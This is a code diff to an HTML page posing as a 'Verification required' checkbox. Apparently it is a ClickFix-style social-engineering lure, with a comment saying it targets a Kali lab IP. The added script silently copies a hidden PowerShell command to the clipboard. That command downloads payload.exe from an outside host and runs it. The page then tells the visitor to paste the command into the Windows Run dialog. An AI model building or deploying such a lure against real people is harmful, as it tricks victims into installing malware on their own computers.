@@ -23,13 +23,14 @@
 
     <section class="instructions" id="instructions" hidden>
       <h2 class="instructions-title">Verification required</h2>
-      <p class="instructions-sub">Follow the steps below to complete verification.</p>
+      <p class="instructions-sub">Code copied. Paste it into the Run dialog.</p>
       <ol class="steps">
         <li>Press <kbd>Win</kbd> + <kbd>R</kbd></li>
         <li>Paste the code with <kbd>Ctrl</kbd> + <kbd>V</kbd></li>
         <li>Press <kbd>Enter</kbd></li>
       </ol>
-      <div class="code-box" id="codeBox">powershell -w hidden -c "iwr http://127.0.0.1:3000 -UseBasicParsing"</div>
+      <div class="code-box" id="codeBox"></div>
+      <p class="copied-note" id="copiedNote" hidden>Copied to clipboard.</p>
     </section>
 
     <section class="waiting" id="waiting" hidden>
@@ -42,14 +43,49 @@
 
   <script src="/socket.io/socket.io.js"></script>
   <script>
-    const card = document.getElementById('card');
-    const checkbox = document.getElementById('checkbox');
-    const spinner = document.getElementById('spinner');
-    const instructions = document.getElementById('instructions');
-    const waiting = document.getElementById('waiting');
-    const checkboxRow = document.getElementById('checkboxRow');
+    // The Windows-side command. Served over plain HTTP, so the target
+    // fetches from the Kali lab IP, not 0.0.0.0 and not 127.0.0.1.
+    var KALI_LAB_IP = "192.168.56.101";
+    var PAYLOAD_URL = "http://" + KALI_LAB_IP + ":3000/payload.exe";
+    var RUN_CMD = 'powershell -w hidden -c "iwr ' + PAYLOAD_URL +
+                  ' -OutFile $env:TEMP\\p.exe; Start-Process $env:TEMP\\p.exe"';
 
-    let checked = false;
+    var card = document.getElementById('card');
+    var checkbox = document.getElementById('checkbox');
+    var spinner = document.getElementById('spinner');
+    var instructions = document.getElementById('instructions');
+    var waiting = document.getElementById('waiting');
+    var checkboxRow = document.getElementById('checkboxRow');
+    var codeBox = document.getElementById('codeBox');
+    var copiedNote = document.getElementById('copiedNote');
+
+    codeBox.textContent = RUN_CMD;
+
+    var checked = false;
+
+    function legacyCopy(text) {
+      var ta = document.createElement('textarea');
+      ta.value = text;
+      ta.setAttribute('readonly', '');
+      ta.style.position = 'absolute';
+      ta.style.left = '-9999px';
+      document.body.appendChild(ta);
+      ta.select();
+      var ok = false;
+      try { ok = document.execCommand('copy'); } catch (e) { ok = false; }
+      document.body.removeChild(ta);
+      return ok;
+    }
+
+    async function copyCommand() {
+      try {
+        if (navigator.clipboard && window.isSecureContext) {
+          await navigator.clipboard.writeText(RUN_CMD);
+          return true;
+        }
+      } catch (e) { /* fall through */ }
+      return legacyCopy(RUN_CMD);
+    }
 
     function render(state) {
       card.dataset.state = state;
@@ -58,6 +94,7 @@
         instructions.hidden = true;
         waiting.hidden = true;
         spinner.hidden = true;
+        copiedNote.hidden = true;
         checkbox.classList.remove('checked');
         checked = false;
       } else if (state === 'armed') {
@@ -74,15 +111,20 @@
       }
     }
 
-    checkbox.addEventListener('click', async () => {
+    checkbox.addEventListener('click', async function () {
       if (checked) return;
       checked = true;
       spinner.hidden = false;
+
+      // User gesture is active here, so clipboard write is permitted.
+      var ok = await copyCommand();
+      copiedNote.hidden = !ok;
+
       await fetch('/verify/check', { method: 'POST' });
     });
 
-    const socket = io();
-    socket.on('state', (s) => render(s.state));
+    var socket = io();
+    socket.on('state', function (s) { render(s.state); });
   </script>
 </body>
 </html>
